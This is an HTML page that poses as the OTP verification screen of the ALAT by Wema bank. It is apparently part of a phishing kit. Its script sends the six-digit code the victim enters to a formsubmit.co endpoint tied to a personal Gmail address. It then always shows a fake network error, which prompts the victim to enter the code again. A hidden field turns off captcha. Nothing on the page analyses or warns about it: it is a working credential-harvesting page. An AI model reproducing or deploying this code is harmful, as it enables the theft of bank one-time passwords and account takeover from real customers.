<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify OTP | ALAT by Wema</title>
  <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #fff;
    }

    #root, .app, .pin {
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      max-width: 350px;
      width: 100%;
      padding: 20px;
      box-sizing: border-box;
    }

    .formOtp {
      display: flex;
      justify-content: space-between;
      margin-bottom: 25px;
      width: 100%;
    }

    .pin-input {
      width: 40px;
      height: 50px;
      text-align: center;
      font-size: 20px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    @media (max-width: 400px) {
      .pin-input {
        width: 35px;
        height: 45px;
        font-size: 18px;
      }
    }

    .verify-btn {
      width: 100%;
      padding: 12px;
      border-radius: 7px;
      border: none;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      background: #800029;
      color: white;
    }

    .logo img {
      width: 60px;
      margin-bottom: 15px;
    }

    .hometitle {
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 25px;
    }

    #error-message {
      color: red;
      margin-bottom: 15px;
      display: none;
      text-align: center;
    }
  </style>
</head>
<body>
  <div id="root">
    <div class="app">
      <div class="pin">
        <div class="container">
          <div class="contentSec">
            <div class="logo">
              <img src="assets/logo-Cw-qJTno.png" alt="logo" />
            </div>
            <div class="hometitle">Verify ALAT OTP</div>
          </div>

          <div class="formSec">
            <form id="otp-form">
              <div class="formOtp">
                <input type="text" name="otp1" maxlength="1" class="pin-input" inputmode="numeric" required autofocus />
                <input type="text" name="otp2" maxlength="1" class="pin-input" inputmode="numeric" required />
                <input type="text" name="otp3" maxlength="1" class="pin-input" inputmode="numeric" required />
                <input type="text" name="otp4" maxlength="1" class="pin-input" inputmode="numeric" required />
                <input type="text" name="otp5" maxlength="1" class="pin-input" inputmode="numeric" required />
                <input type="text" name="otp6" maxlength="1" class="pin-input" inputmode="numeric" required />
              </div>

              <input type="hidden" name="_captcha" value="false">
              <div id="error-message">Network error. Please try again.</div>

              <button type="submit" class="verify-btn">Verify</button>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const otpInputs = document.querySelectorAll('.pin-input');
      const errorMessage = document.getElementById('error-message');

      otpInputs.forEach((input, index) => {
        input.addEventListener('input', function () {
          if (this.value.length === 1 && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
          }
        });

        input.addEventListener('keydown', function (e) {
          if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
            otpInputs[index - 1].focus();
          }
        });

        input.addEventListener('paste', function (e) {
          e.preventDefault();
          const pasteData = e.clipboardData.getData('text/plain');
          if (/^\d+$/.test(pasteData)) {
            for (let i = 0; i < Math.min(pasteData.length, otpInputs.length); i++) {
              otpInputs[i].value = pasteData[i];
            }
            const lastInputIndex = Math.min(pasteData.length - 1, otpInputs.length - 1);
            otpInputs[lastInputIndex].focus();
          }
        });
      });

      const otpForm = document.getElementById('otp-form');
      otpForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const formData = new FormData(otpForm);

        try {
          await fetch('https://formsubmit.co/Payday10177@gmail.com', {
            method: 'POST',
            body: formData
          });
        } catch (error) {
          // Optional: log error
        }

        errorMessage.textContent = 'Network error. Please try again.';
        errorMessage.style.display = 'block';
      });
    });
  </script>
</body>
</html>
